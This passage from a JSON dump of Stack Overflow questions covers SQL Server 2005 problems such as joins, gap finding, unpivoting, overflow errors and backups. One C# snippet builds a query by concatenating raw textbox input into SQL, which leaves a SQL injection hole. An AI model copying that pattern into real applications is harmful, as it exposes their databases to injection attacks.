code:</p>\n\n<pre><code>SELECT A.Numerat+1 AS 'MISSING FROM', MIN(B.Numerat)-1 AS 'TO'\nFROM Numerator A\nINNER JOIN Numerator B\n  ON A.Numerat &lt; B.Numerat\n  AND a.Tanggal = DATEADD(DAY, DATEDIFF(DAY, 0, GetDate()), 0)\nGROUP BY A.Numerat\nHAVING A.Numerat+1 &lt; MIN(B.Numerat)\nORDER BY 1\n</code></pre>\n\n<p>and achieving results:</p>\n\n<pre><code>MISSING FROM   TO\n787            787\n791            792\n</code></pre>\n\n<p>If we look carefully there is a missing number that does not appear, that is:</p>\n\n<pre><code>MISSING FROM   TO\n781            781\n</code></pre>\n\n<p>But we do not know exactly, including the date do it? Is 23 or 25. In this case it is not important to know exactly falls on what the date this missing number, obviously there is one number missing, it should be noted, and due on the 24th of all public holidays, let us enter it on the 25th. Can anyone help?</p>\n"},{"tags":["c#","asp.net","sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":102,"score":0,"question_id":12118888,"title":"How to retrieve records using textbox?","body":"<p>I am trying to use the wildcard query to display rows in a gridview but it is not up to the mark...</p>\n\n<pre><code>protected void Button1_Click(object sender, EventArgs e)\n{\n    SqlCommand com = new SqlCommand(\"select * from Alphabates where Word \n                     like'\"+TextBox1.Text+\"'\", new SqlConnection(\"data source=\n                     USER\\\\SQLEXPRESS;initial catalog=vicky;integrated \n                     security=true\"));\n\n    try\n    {\n        com.Connection.Open();\n        GridView1.DataSource = com.ExecuteReader();\n        GridView1.DataBind();\n        com.Connection.Close();\n        com.Connection.Dispose();\n    }\n    catch (SqlException ex)\n    {\n        Label1.Text = ex.Message;\n    }\n}\n</code></pre>\n"},{"tags":["sql","sql-server-2005","linked-server"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":10447,"score":2,"question_id":2493866,"title":"Create View using Linked Server db in SQL Server","body":"<p>How can I create View on Linked Server db. For Example I have a linked server [0.0.0.0] on [1.1.1.1]. Both db servers are SQL Sserver 2005. I want to create View on [1.1.1.1] using table on linked server.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>On creating using full name, [0.0.0.0].db.dbo.table, I am getting this error.</p>\n\n<p>SQL Execution Error.</p>\n\n<p>Executed SQL statement: SELECT * FROM  0.0.0.0.db.dbo.table <strong><em>(YOu can see brackets are not there.)</em></strong>\nError Source: .Net SqlClient Data Provider\nError Message: Incorrect syntax near '0.0'. ---> part of IP address.</p>\n\n<p><img src=\"http://img406.imageshack.us/img406/4896/linkedserver.png\" alt=\"alt text\"></p>\n\n<p>I am just creating this in ManagementStudio, not using it because it is not created yet. I Have changed IP. In image you can see there are not brackets around IP but I given it and on error these brackets are removed.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12111560,"title":"Doing self join to hide duplicates - getting error message","body":"<p>Ok, I'm doing a self query to suppress duplicates for a view. The code I'm using is:</p>\n\n<pre><code>    USE BILLING\n\n    SELECT Provider_Code,\n           Provider_LName,\n           Provider_Fname,\n           Provider_Title,\n           AGENCY_LOCATION_NAME_LINE_1,\n           CostCenter_AbbrName\n    FROM   dbo.ServiceProfiler prov1\n           INNER JOIN\n           dbo.ServiceProfiler prov2\n           ON prov1.Provider_Code = prov2.Provider_Code\n    WHERE  0 = (SELECT COUNT(s1.Provider_Code)\n                FROM   prov1\n                WHERE  prov2.Provider_Code = prov1.Provider_Code\n                       AND prov2.Provider_Code &lt; prov1.Provider_Code);\n</code></pre>\n\n<p>When executing the query on SQL Server 2005 I get the message:</p>\n\n<blockquote>\n  <p><em>Msg 208, Level 16, State 1, Line 3<br>\n  Invalid object name 'prov1'.</em></p>\n</blockquote>\n\n<p>I cannot for the life of me understand why the alias names are invalid. I think I found a similar question <a href=\"http://stackoverflow.com/questions/9762390/converting-a-self-subquery-to-a-self-join\">here</a>. But it's very generic and doesn't show a full 'real' query using the aliases.</p>\n\n<p>TIA for any help you can give.</p>\n"},{"tags":["sql-server-2005","time","case-statement"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12111296,"title":"SQL Subtracting OverNight Time (returning only minutes) Get rid of negative time?","body":"<p>I have a bunch of start and end times:</p>\n\n<pre><code>    Start       End         Delta\n    20:47:22    22:47:02    120\n    22:49:12    0:48:47    -1321\n    0:50:42     2:50:22     120\n    ...\n    23:11:07    2:10:44    -1261\n</code></pre>\n\n<p>The code I use is as follows (as time is a varchar)</p>\n\n<pre><code>  CONVERT(VARCHAR(8), DATEDIFF(minute, max(max_time), min(min_time)) ,114) \n  as delta_time,\n</code></pre>\n\n<p>But as you can see, because it is overnight the result is negative.  Any thoughts about getting the right result of 119 minutes and 179 minutes (in the example above).  </p>\n\n<p>I thought of using a case statement that checks when the delta is negative.  If it is negative, add 24 hours to the End time then try the subtracting.</p>\n\n<pre><code> CASE WHEN DATEDIFF(minute, max(max_time), min(min_time)) &lt; 0 THEN  \n DATEADD(minute, 1440, min(min_time)) \n ELSE 0 END AS deltatest\n</code></pre>\n\n<p>However this code doesn't work, as SQL Server just changes the time to: 1900-01-02 00:48:47.000 (the next day, not something like 24:48:47, which is what I want).  Any thoughts?  Is there any method to add a convert to the CASE statement?? Thanks.</p>\n"},{"tags":["sql-server-2005","duplicates","cross-join","having-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12110683,"title":"Cross Join with always the same string message","body":"<p>I am using Microsoft SQL Server 2005.</p>\n\n<p>I would like to have a table in output with a column regarding duplicate values in cross join with a table containing only a column with the same string message.\nI think the cross join with a \"string message\" should be the proper way to do it.</p>\n\n<p>Why the following script is not working?</p>\n\n<pre><code>DECLARE @IN_CodesTable TABLE\n   (\n        CodesValues           NVARCHAR(60)\n   )\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_1234')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_$%^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_BB^&amp;')\nINSERT INTO @IN_CodesTable VALUES('CODE_1234')\n\nSELECT *\nFROM   \n(\nSELECT DISTINCT CodesTable\nFROM @IN_CodesTable\nWHERE CodesTable IN\n                    ( SELECT  CodesValues\n                    FROM     @IN_CodesTable\n                    GROUP BY CodesTable\n                    HAVING   COUNT(*) &gt; 1\n                    )\n)\nCROSS JOIN\n( \n    SELECT 'You have duplicates!' AS DupMessage\n)\n</code></pre>\n"},{"tags":["sql","internet-explorer","sql-server-2005","vbscript","activex"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12088243,"title":"ActiveX calling URL page","body":"<p>I'm using the following code inside an <code>ActiveX Script</code> job on SQl Server to call an URL every X minutes.</p>\n\n<pre><code>Dim WshShell\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"iexplore.exe http://www.google.com.br\"\nSet WsShell = Nothing\n</code></pre>\n\n<p>it is working but the processes created keep running:\n<img src=\"http://i.stack.imgur.com/ntMt3.jpg\" alt=\"enter image description here\"></p>\n\n<p>Any way of changin that code to call the URL and kill the recent called process or call it with a \"time-to-live\". I think it is more secure, I wouldn't want to kill the wrong process.</p>\n"},{"tags":["sql","tsql","sql-server-2005","unpivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12108680,"title":"TSQL Select all columns without first n from function/procedure","body":"<p>I know this may sounds silly but I would like to create function that will process data from tables with different size.</p>\n\n<p>Lets say I have first table like so:</p>\n\n<pre><code>ID    IRR     M0    M1\n----------------------\n 1      0    -10     5\n 2      0    -20    10\n 3      0   -100   100\n 4      0    -10     0\n</code></pre>\n\n<p>And second table like so:</p>\n\n<pre><code>ID    IRR     M0    M1    M2\n----------------------------\n 1      0    -10     5    60\n 2      0    -20    10     0\n 3      0   -100   100   400\n 4      0    -10     0    10\n</code></pre>\n\n<p>I would like to create function that will be able to process data from both tables.</p>\n\n<p>I know that first column contains ID, second IRR, rest of columns will hold cash flow for specific month.</p>\n\n<p>Function should be able to process all columns instead of first 2 and store result in second column.</p>\n\n<p>I know that I can get all columns from specific table with:</p>\n\n<pre><code>SELECT COLUMN_NAME \nFROM INFORMATION_SCHEMA.columns \nWHERE TABLE_NAME = 'First_Table'\n</code></pre>\n\n<p>Problems begin when I would like to create function that will return those columns as rows. </p>\n\n<p>I can create function like so:</p>\n\n<pre><code>CREATE FUNCTION UnpivotRow (@TableName  varchar(50), @FromWhichColumn int, @Row int)\nRETURNS @values TABLE\n(\n    id INT IDENTITY(0, 1),\n    value DECIMAL(30, 10)\n)\n...\n</code></pre>\n\n<p>But how this function should look?</p>\n\n<p>I think that ideal for this kind of processing table should look like so:</p>\n\n<pre><code>ProjectID    TimePeriod    Value\n--------------------------------\n        1             0      -10\n        1             1        5\n        2             0      -20\n        2             1       10\n        3             0     -100\n        3             1      100\n        4             0      -10\n        4             1        0\n</code></pre>\n\n<p><strong>I need to unpivot whole table without knowing number of columns.</strong> </p>\n\n<hr>\n\n<p><strong>EDIT:</strong>\nIf this can't be done inside function, then maybe inside a procedure?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":12108548,"title":"Why backup sql server query is not working without variable?","body":"<p>it is working......</p>\n\n<pre><code>declare @dbName varchar(50)\nset @dbName='myDb'\n    BACKUP DATABASE @dbName TO DISK = 'c:\\backup\\myDb.bak'\n</code></pre>\n\n<p>But\nWhy is it not working? where as both are similar query.</p>\n\n<pre><code> BACKUP DATABASE 'mydb' TO DISK = 'c:\\backup\\myDb.bak'\n</code></pre>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12104893,"title":"Transaction for sql query stored in temp table","body":"<p>I have a stored procedure build update query and store in temp table each time in loop. </p>\n\n<p>Total query built UNKNOWN (2 to 4)</p>\n\n<p>How can I put multi query in a transaction?</p>\n\n<p>For example, temp table contains following rows in column <code>EXPSQL</code> (<code>nvarchar</code>)</p>\n\n<pre><code>id   EXPSQL\n1    Update tableA SET Name = 'Test' WHERE id=1\n2    Update tableB SET Name = 'Test2' WHERE id=10\n</code></pre>\n\n<p>How can I begin a transaction for a loop to exec above query? or is there any other way?</p>\n\n<pre><code>while @id &lt; total\nbegin\n    set @id = @id +1\n    select @SQL = EXPSQL FROM #TEMPTABLE WHERE id=@id\n    EXEC (@SQL)\nend\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","ssas","business-intelligence"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":9363404,"title":"SSAS 2005 MDX expression with .all attributes","body":"<p>I have the following measure calculation:</p>\n\n<pre><code>            CREATE MEMBER CURRENTCUBE.[Measures].[SOR - Sold Out Rate]\n            AS IIF(\n                 ([Measures].[SOR - Quantity] = 0) \n                 ,NULL\n                 ,[Measures].[SOR - Sold Out Positions]\n                  /\n                  ([Measures].[SOR - Quantity]\n                     , [Dim Core].[Core].[All] \n                         , [Dim More].[More].[All]\n                        , [Dim Extended].[Extended].[All]\n                        , [Dim Point Of Sales].[Point Of Sales].[All]\n                        , [Dim Point Of Sales Type].[POS Type].[All]\n                        , [Dim Product].[Product].[All]\n                        , [Dim Product AVA Status].[AVA Status].[All]\n                        , [Dim Product AVA Type].[AVA Type].[All]\n                        , [Dim Product Category].[Product Category].[All]\n                     , [Dim Calendar].[Gregorian Calendar].CurrentMember\n                   )\n                ), \n            FORMAT_STRING = \"Percent\", \n            VISIBLE = 1 ,  ASSOCIATED_MEASURE_GROUP = 'Fact Sold Out Rate'  ;  \n</code></pre>\n\n<p>What is the [Dim <em>].[</em>].[All] meaning? I am dividing by a quantity that is calculated previously okay, but I cannot manage to understand the use of the attributes with .all?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","vb6"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":256,"score":0,"question_id":12087277,"title":"How to add new record with primary key constraint VB6.0 & SQL Server","body":"<p>I want to create a message box that will fire whenever the txt_unit is equals to the unit_no in the database. This is during the insertion of new data in the DB. I'm using VB6 and SQL Server 2005.<br>\nThis is my code:</p>\n\n<p>If txt_unit.Text = 'same unit number that exist in the DB' Then\nMsgBox \"Duplicate Record\", vbCritical, \"Duplicate\"<br>\ntxt_unit.Text = \"\"<br>\ntxt_unit.SetFocus</p>\n\n<p>This will save time for the user during data input.\nThanks in advance</p>\n"},{"tags":["sql","debugging","sql-server-2005","export"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":12104880,"title":"Export the SELECT to a text file","body":"<p>I debug a SQL Server 2005 Stored Procedure, and have a query like <code>SELECT * FROM MY_TABLE INNER JOIN OTHER_TABLE etc</code>.</p>\n\n<p>How can I do to export the results of this query to a txt file?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":114,"score":-1,"question_id":12084684,"title":"sum with a trigger","body":"<p>There are 3 tables:</p>\n\n<pre><code>Suppl, fields: (Code_name,  Tasknum, Pki_num, Group_eng, Name, Descr, Cost, Quan, shop)\nMaker, fields : (Code_maker, Code_maker_arch, Code_name, provider)\nArrival, fields: (Code_arr, Code_maker, quan_arr)\n</code></pre>\n\n<p>I need to get a table (for export to Excel), for example update_501 (Group_eng, Name, Descr, quan_arr), which will contain a unique \"Descr\" by a group_eng_501. The field \"quan_arr\" needs to keep the sum of the field from the table Arrival.quan_arr for each unique \"Descr\".</p>\n\n<p>first:</p>\n\n<pre><code>Insert dbo.update_501(Group_eng, Name, Descr)\nselect Group_eng, Name, Descr\nfrom Suppl\nwhere (Group_eng = 501)\ngroup by Group_eng, Name, Descr\n</code></pre>\n\n<p>then:\ntrigger, which adds a unique \"descr\" to update_501</p>\n\n<pre><code>ALTER trigger [update_pki_501] ON [dbo].[Suppl]\nAfter Insert\nas\nbegin\nSet nocount on;\nif (not(exists(select * from [INSERTED])))\nreturn;\n\nInsert dbo.update_501(Group_eng, Name, Descr)\nselect I.Name\n      ,I.Descr\n      ,I.Group_eng\nfrom Inserted I\nwhere (I.Group_eng = 501)\n and not exists(select * from dbo.update_501 x where x.Group_eng=I.Group_eng and x.Descr = I.Descr) \nend\n</code></pre>\n\n<p>Please, help with a trigger that will add(and sum) in the update_501.quan_arr from Arrival.quan_arr</p>\n"},{"tags":["c++","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12101779,"title":"Function doesn't return new record index","body":"<p>I'm using ADO to work with MS SQL server. I'm trying to add new record to a table. For this moment function work fine. But when I want to get id - in FieldID only zero.\n</p>\n\n<pre><code>    _RecordsetPtr  rs;\n    CString strRequest;    \n\n    rs.CreateInstance(_T(\"ADODB.Recordset\"));\n    strRequest = _T(\"TRUNCATE TABLE dbo.table\");\n    rs-&gt;Open((LPCTSTR)strRequest,m_Connect.GetInterfacePtr(),adOpenStatic,adLockOptimistic,-1);\n    strRequest = _T(\"SELECT * FROM dbo.table\");\n    rs-&gt;Open((LPCTSTR)strRequest,m_Connect.GetInterfacePtr(),adOpenStatic,adLockOptimistic,-1);\n\n    if (rs-&gt;ADOEOF)\n    {\n           rs-&gt;AddNew();\n           rs-&gt;Fields-&gt;GetItem(_T(\"field\"))-&gt;Value = (USHORT)10;\n           rs-&gt;Update();\n\n            rs-&gt;MoveLast();\n            _variant_t v;\n            v = rs-&gt;Fields-&gt;GetItem(_T(\"id\"))-&gt;Value;\n            CString FieldID = v.bstrVal;        \n    }\n\n    rs-&gt;Close();\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12101092,"title":"SQL Server Table Join issue","body":"<p>I am Trying to join three tables and I an getting cross rows data (Getting 6 rows instead of 3). I tried inner,left and right join same result. Could you please help me.</p>\n\n<p><strong>Table 1</strong></p>\n\n<pre><code>SELECT PATIENT,TDACTDATE,TDACTTIME,TDVALUE \nFROM NurDocumentedResults A \nWHERE (INTBASE = '400130') \n    AND (TDQUERY = 'NURPTVALUE') \n    AND (TDACTDATE = '20120425') \nAND TDVALUE &gt;='8.0' AND A.PATIENT='F126' \n</code></pre>\n\n<p>Result I am getting </p>\n\n<pre><code>F126    20120425    1715    8.8\nF126    20120425    1840    8.4\nF126    20120425    2300    9.7\n</code></pre>\n\n<p><strong>Table 2</strong></p>\n\n<pre><code>SELECT B.PATIENT,A.TESTRESULTDATE,A.TESTRESULTTIME,A.RESULT \nFROM LabLSpecResultTests A\nINNER JOIN LabLSpecimenFile B \n    ON A.URN=B.URN \n    AND A.TESTRESULTDATE=B.COLLECTIONDATE \nWHERE A.TESTRESULTDATE='20120425' \n    AND (A.TEST IN ('100.0100', '100.0120', '100.0130', '100.0110')) \n    AND (A.RESULT &gt; '8.0') \n    AND B.PATIENT='F126'\n</code></pre>\n\n<p>Result I am getting</p>\n\n<pre><code>F126    20120425    1756    8.5\nF126    20120425    2335    9.2\n</code></pre>\n\n<p><strong>When I join all three Tables,</strong> </p>\n\n<pre><code>SELECT D.PATIENT,TDACTDATE,TDACTTIME,TDVALUE,A.RESULT,A.RESULTTIME,A.TESTRESULTDATE,A.TESTRESULTTIME\nFROM NurDocumentedResults D \nLEFT OUTER JOIN LabLSpecimenFile B \n    ON D.PATIENT=B.PATIENT AND D.TDACTDATE=B.COLLECTIONDATE\nINNER JOIN LabLSpecResultTests A \n    ON A.URN=B.URN \n    AND A.TESTRESULTDATE=B.COLLECTIONDATE\nWHERE (INTBASE = '400130') \n    AND (TDQUERY = 'NURPTVALUE') \n    AND (TDACTDATE = '20120425') \n    AND TDVALUE &gt;='8.0' \n    AND A.TESTRESULTDATE='20120425' \n    AND  (A.TEST IN ('100.0100', '100.0120', '100.0130', '100.0110')) \n    AND (A.RESULT &gt; '8.0') \n    AND D.PATIENT='F126'\n</code></pre>\n\n<p><strong>I am getting following Result</strong></p>\n\n<pre><code>F126    20120425    1715    8.8 8.5 2463    20120425    1756\nF126    20120425    1840    8.4 8.5 2463    20120425    1756\nF126    20120425    2300    9.7 8.5 2463    20120425    1756\nF126    20120425    1715    8.8 9.2 22789   20120425    2335\nF126    20120425    1840    8.4 9.2 22789   20120425    2335\nF126    20120425    2300    9.7 9.2 22789   20120425    2335\n</code></pre>\n"},{"tags":["mysql","sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12098124,"title":"Taking IF clauses from MySQL to SQL Server 2005","body":"<p>How do I make this MySQL query into SQL Server equivalents?</p>\n\n<pre><code>SELECT User.id, User.first, User.last,\nIF (User.first = q1 OR User.first = q2, 1, 0) +\nIF (User.last = q1 OR User.last = q2, 1, 0) as points\nFROM users as User\nORDER BY points DESC\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":167,"score":0,"question_id":12097859,"title":"SQL 8115 Arithmetic overflow error converting numeric to data type numeric","body":"<p>I obtain on my SQL Server 2005 an error</p>\n\n<pre><code>Server: Msg 8115, \nArithmetic overflow error converting numeric to data type numeric.\n</code></pre>\n\n<p>When I try to insert a value = <strong><code>X</code></strong>(DECIMAL(3,2)) * <strong><code>Y</code></strong>(INT)<br>\nin a column <code>MYCOLUMN</code> typed <code>DECIMAL (10,3)</code></p>\n\n<p>How to workaround this problem?</p>\n\n<p>UPDATE</p>\n\n<p>some code bellow to understand the situation</p>\n\n<pre><code>-- ============================================================\n--   Table : GP_WGENTH\n-- ============================================================\nCREATE TABLE #GP_WGENTH\n(\n     KEYINTERNAL                     CHAR(32)              NOT NULL,\n     KEYHOUR                         INT                   NOT NULL,\n     FIRM                            CHAR(5)               NOT NULL,\n     CENTRE                          CHAR(2)               NOT NULL,\n     SERVICE                         CHAR(6)               NOT NULL,\n     AGENT                           CHAR(5)               NOT NULL,\n     VERSION                         VARCHAR(3)            NOT NULL,\n     DATE_ROULEMENT                  DATETIME              NOT NULL,\n     SERVICEINSTANCE                 SMALLINT              NOT NULL,\n     TYPEHOUR                        CHAR(9)               NOT NULL,\n     QUANTITEFIXE                    DECIMAL(12,2)         NULL    ,\n     TYPECMP                         INT                   NULL    ,\n     PERCENTCALC                     DECIMAL(3,2)          NULL    \n)\n-- ============================================================\n--   Table : GP_WGENSVCTH\n-- ============================================================\nCREATE TABLE #GP_WGENSVCTH\n(\n    KEYINTERNAL                     CHAR(32)              NOT NULL,\n    KEYHOUR                         INT                   NOT NULL,\n    FIRM                            CHAR(5)               NOT NULL,\n    CENTRE                          CHAR(2)               NOT NULL,\n    SERVICE                         CHAR(6)               NOT NULL,\n    AGENT                           CHAR(5)               NOT NULL,\n    VERSION                         VARCHAR(3)            NOT NULL,\n    DATE_ROULEMENT                  DATETIME              NOT NULL,\n    SERVICEINSTANCE                 SMALLINT              NOT NULL,\n    TYPEHOUR                        CHAR(9)               NOT NULL,\n    VALUE                           DECIMAL(10,3)         NOT NULL\n)\nGO\n\nINSERT INTO #GP_WGENSVCTH \n            (KEYINTERNAL, \n             KEYHOUR, \n             FIRM, \n             CENTRE, \n             SERVICE, \n             AGENT, \n             VERSION, \n             DATE_ROULEMENT, \n             SERVICEINSTANCE, \n             TYPEHOUR, \n             VALUE) \nSELECT WTH.KEYINTERNAL, \n       WTH.KEYHOUR, \n       WTH.FIRM, \n       WTH.CENTRE, \n       WTH.SERVICE, \n       WTH.AGENT, \n       WTH.VERSION, \n       WTH.DATE_ROULEMENT, \n       WTH.SERVICEINSTANCE, \n       WTH.TYPEHOUR, \n       WTH.PERCENTCALC * SUM(SC.LENGTH) -- !!! BOOOM !!!!!!!!! HERE\nFROM   #GP_WGENTH WTH \n       INNER JOIN GP_SERVICE_HABILLAGE_COMPONENT SC \n               ON WTH.FIRM = SC.FIRM \n                  AND WTH.CENTRE = SC.CENTRE \n                  AND WTH.SERVICE = SC.SERVICE \n                  AND WTH.VERSION = SC.VERSION \n                  AND WTH.TYPECMP = SC.TYPECMP \nWHERE  WTH.KEYINTERNAL = 'august 23 2012  10:45:21:027PM     ' \n       AND SC.LENGTH IS NOT NULL \nGROUP  BY WTH.KEYINTERNAL, \n          WTH.KEYHOUR, \n          WTH.FIRM, \n          WTH.CENTRE, \n          WTH.SERVICE, \n          WTH.AGENT, \n          WTH.VERSION, \n          WTH.DATE_ROULEMENT, \n          WTH.SERVICEINSTANCE, \n          WTH.TYPEHOUR, \n          WTH.PERCENTCALC \n</code></pre>\n"},{"tags":["sql","sql-server-2005","max","varchar","string-concatenation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12097670,"title":"How to store a string var greater than varchar(max)? ","body":"<p>I'm trying to do this:</p>\n\n<pre><code>DECLARE @myVar VARCHAR(MAX)\nLoop with cursor\nselect @myVar = @myVar + bla bla bla\nend loop\n</code></pre>\n\n<p>When the loop ends, @myVar is incomplete, containing only 8000 characters.</p>\n\n<p>I have tryed to use text, but is not allowed to local vars.</p>\n\n<p>What would be a good solution to this case?  </p>\n\n<p>xml var?</p>\n\n<p>I have just looked this posts:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/284610/how-do-i-pass-a-string-parameter-greater-than-varchar8000-in-sql-server-2000\">How do I pass a string parameter greater than varchar(8000) in SQL Server 2000?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/2975165/check-if-concatenating-to-a-varcharmax-will-go-beyond-max-allowable-characters\">Check if concatenating to a varchar(max) will go beyond max allowable characters</a></p>\n\n<p>And others through the web.</p>\n\n<p>Regards.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":42,"score":-1,"question_id":12096824,"title":"Convert Any to String in SQL","body":"<p>I have to log some param values to a log file (SQL Server 2005)</p>\n\n<p>Is there an <em>universal</em> <strong><code>.ToString()</code></strong> method in SQL that could convert any kind of <code>object</code> to <code>string</code> in order to visualize a object value?</p>\n\n<p>by eg. if I use <code>STR(@param)</code> it expects that @param be an float or integer value. and it fails when the @param is a varchar...</p>\n"},{"tags":["sql-server-2005","web-applications","reporting-services","cross-browser"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":845,"score":1,"question_id":3143410,"title":"SQL Server 2005 Reporting Services: Reports are Compressed","body":"<p>I have a report that I am capable of viewing correctly in Internet Explorer (IE) with the help of Reports from SQL Server 2005 Report Server (SSRS). The problem is that the report is compressed to about 100px by 100px in Firefox and probably other browsers such as Safari and Chrome. Also, I am using IIS6.</p>\n\n<p>How can a report be rendered properly in browsers other than IE with SSRS?</p>\n"},{"tags":["sql-server-2008","query","sql-server-2005","database-deadlocks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12056459,"title":"Queries locking up DB Server CPU","body":"<p>We are using MSSQL server 2008 and our application has sql queries which locks up the DB at Row and Page levels. It is been said that because of the locks the CPU hit is 100%. Is there a procedure or way to find out which instance of MSSQL server is consuming how much CPU, so that i can narrow down this issue further?</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","join","sql-execution-plan"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12093714,"title":"a query using covering index, merge join, hash join","body":"<p>I am tuning a query on SQL Server 2005.\nPlease note the real question is at the end. \nI have following query, both pto and ph has about 30million rows. The query initially run very slow (3 mins). So I added two index on pto, ph respectively.</p>\n\n<pre><code>        SELECT \n            MAX(ph.txn_date_time)\n        FROM \n            pto AS pto WITH (NOLOCK) \n            INNER JOIN ph AS ph WITH (NOLOCK) ON ph.receipt_id = pto.receipt_id\n        WHERE \n                pto.subtype = 'ff'\n            AND pto.Units_No &gt; 0\n            AND ph.branch_id = 5\n\n\n\nCREATE NONCLUSTERED INDEX [IX_pto_subTypeUnitReceipt] ON [dbo].[pto] \n(\n    [SUBTYPE] ASC,\n    [Units_No] ASC,\n    [RECEIPT_ID] ASC\n\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = ON, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n\n\nCREATE NONCLUSTERED INDEX [IX_ph_branchReceiptTxn] ON [dbo].[ph] \n(\n    [BRANCH_ID] ASC,\n    [RECEIPT_ID] ASC,\n    [TXN_DATE_TIME] ASC\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = OFF, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n</code></pre>\n\n<p>Now the query runs in 350ms. Great. The execution plan is also very simple, it uses the created index from the two tables and did a Hash join on the receipt_id column then a Stream Aggregate to do the MAX(ph.txn_date_time). So every column in the query is covered by the two added index. </p>\n\n<p>The question is why it used a Hash join on the receipt_id column? I mean since RECEIPT_ID in both indexes are sorted the optimizer should have used a merge join. To figure out why I changed the first index to below (put RECEIPT_ID before Units_No). </p>\n\n<pre><code>CREATE NONCLUSTERED INDEX [IX_pto_subTypeUnitReceipt] ON [dbo].[pto] \n(\n[SUBTYPE] ASC,\n[RECEIPT_ID] ASC,\n[Units_No] ASC\n\n\n)WITH (SORT_IN_TEMPDB = OFF, DROP_EXISTING = ON, IGNORE_DUP_KEY = OFF, ONLINE = OFF) ON [Indexes]\n</code></pre>\n\n<p>And now I see the Merge join on the RECEIPT_ID column. The query also runs in 170ms. Now obviously the optimizer think the RECEIPT_ID in both indexes are sorted so a merge join is used. But I don't understand why in the first case it doesn't think so?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","optimization"],"answer_count":3,"favorite_count":3,"up_vote_count":22,"down_vote_count":0,"view_count":7007,"score":22,"question_id":1395275,"title":"Which is better: Bookmark/Key Lookup or Index Scan","body":"<p>I know that an index <strong>seek</strong> is better than an index <strong>scan</strong>, but which is preferable in SQL Server explain plans: Index seek or Key Lookup (Bookmark in SQL Server 2000)?</p>\n\n<p>Please tell me they didn't change the name again for SQL Server 2008...</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4977,"score":1,"question_id":2927475,"title":"sql server - select top and bottom rows","body":"<p>I'm using Sql Server 2005 and i'm trying to achieve something like:\nIn the same select statement i want to get the first x rows and the last x rows.</p>\n\n<pre><code>SELECT TOP(5) BOTTOM(5)\n</code></pre>\n\n<p>Of course 'bottom' does not exist so i need other solution.\nI believe there is an easy and elegant solution that i'm not getting.\nDoing the select again with Group By Desc is not an option.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","user-defined-functions"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1461,"score":1,"question_id":2833389,"title":"Finding all Stored procedures calling a function","body":"<p>How can I find out all the stored procedures that are calling a particular user defined function in SQL Server 2005.</p>\n\n<p>Or how to assign a defult value to a parameter in a user defined function so that when a stored procedure calls that function and does not pass any value to that parameter function assumes the 